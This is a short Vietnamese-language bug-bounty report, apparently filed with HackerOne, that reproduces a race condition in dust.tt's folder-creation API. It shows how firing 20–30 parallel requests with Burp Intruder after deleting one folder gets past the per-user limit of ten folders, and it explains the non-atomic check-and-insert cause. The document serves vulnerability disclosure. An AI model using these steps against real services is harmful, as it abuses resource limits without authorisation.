# https://hackerone.com/reports/3104355


## 1. Môi trường

* Workspace đã tạo sẵn một Space (ví dụ `space123`).
* Giới hạn: **10 thư mục** cho mỗi user trong `space123`.
* Công cụ: **Burp Suite Intruder** (hoặc script Python/Go hỗ trợ đa luồng).

---

## 2. Tạo đủ 10 thư mục “chuẩn”

1. Đăng nhập bằng user A.
2. Dùng UI hoặc API tạo lần lượt 10 thư mục:

   ```
   POST https://dust.tt/api/w/{w_id}/knowledge/spaces/space123/folders
   Body: {"name":"Folder1"} … {"name":"Folder10"}
   ```
3. Server trả **409 Conflict** hoặc lỗi “Limit reached” nếu thử tạo thư mục thứ 11.

---

## 3. Xóa 1 thư mục để đưa tổng xuống 9

1. Xóa ví dụ `Folder5`:

   ```
   DELETE https://dust.tt/api/w/{w_id}/knowledge/spaces/space123/folders/{folder5Id}
   ```
2. Kiểm tra còn lại 9 thư mục.

---

## 4. Bùng nổ request tạo thư mục song song

1. Mở **Burp Intruder**:

   * Target: `POST /api/w/{w_id}/knowledge/spaces/space123/folders`
   * Payload (as many as 20–30 requests):

     ```json
     {"name":"RaceFolder{{#}}"}
     ```
2. Cấu hình **throttle = 0**, **threads = 20** (tốc độ cao ngang nhau).
3. Chạy Intruder cùng lúc — thay vì check-and-insert tuần tự, server xử lý nhiều request bất đồng bộ.

> Kết quả: Khoảng 15–20 requests vẫn trả **200 OK**, tức đã tạo thành công >10 thư mục.

---

## 5. Xác minh thành công

1. Gọi API list folders:

   ```
   GET https://dust.tt/api/w/{w_id}/knowledge/spaces/space123/folders
   ```
2. Đếm folder có:

   ```
   folders.length > 10
   ```
3. Chụp màn hình bảng danh sách, thấy vượt 10.

---

## 6. Nguyên nhân

* **Check limit** và **insert** không nằm trong cùng một transaction/lock.
* Khi xóa thư mục, counter giảm; nhưng nhiều luồng cùng check thấy còn chỗ, rồi đều chèn tiếp bất chấp giới hạn.

---

